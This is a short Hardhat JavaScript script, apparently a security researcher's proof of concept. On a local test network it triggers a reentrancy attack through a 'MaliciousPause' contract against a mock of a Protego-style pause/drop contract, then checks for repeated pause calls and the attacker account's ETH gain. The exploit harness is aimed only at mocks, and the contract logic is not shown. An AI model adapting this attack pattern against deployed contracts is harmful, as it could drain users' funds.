// scripts/run_attack.js
const fs = require("fs");
const path = require("path");
const hre = require("hardhat");

function load() {
  return JSON.parse(fs.readFileSync(path.join(__dirname, "..", "logs", "addresses.json"), "utf8"));
}

async function main() {
  const [deployer, d2] = await hre.ethers.getSigners();
  const a = load();

  const attacker = a.attackerEOA || d2.address;
  const protego = await hre.ethers.getContractAt("ProtegoMock", a.protegoMock, deployer);
  const pause   = await hre.ethers.getContractAt("MaliciousPause", a.maliciousPause, deployer);

  const balBefore = await hre.ethers.provider.getBalance(attacker);

  const usr = "0x" + "11".repeat(20);
  const tag = hre.ethers.utils.formatBytes32String("TAG");
  const fax = "0x";
  const eta = 0;

  console.log("Calling ProtegoMock.drop...");
  const tx = await protego.drop(usr, tag, fax, eta, { gasLimit: 5_000_000 });
  const rcpt = await tx.wait();
  console.log("Mined in block", rcpt.blockNumber);

  const called = await pause.called();
  const balAfter = await hre.ethers.provider.getBalance(attacker);
  const gain = hre.ethers.utils.formatEther(balAfter.sub(balBefore));

  const evts = await protego.queryFilter(protego.filters.Drop(), rcpt.blockNumber, rcpt.blockNumber);

  console.log("pause.called():", called.toString());        // atteso >=2
  console.log("Drop events in tx:", evts.length);           // atteso >=2
  console.log("Attacker gain (ETH):", gain);                // atteso 2.0
  if (called.toNumber() >= 2 && evts.length >= 2) {
    console.log("[OK] Logical reentrancy confirmed with real impact.");
  } else {
    console.log("[WARN] Unexpected result; check wiring/gas.");
  }
}

main().catch((e) => { console.error(e); process.exitCode = 1; });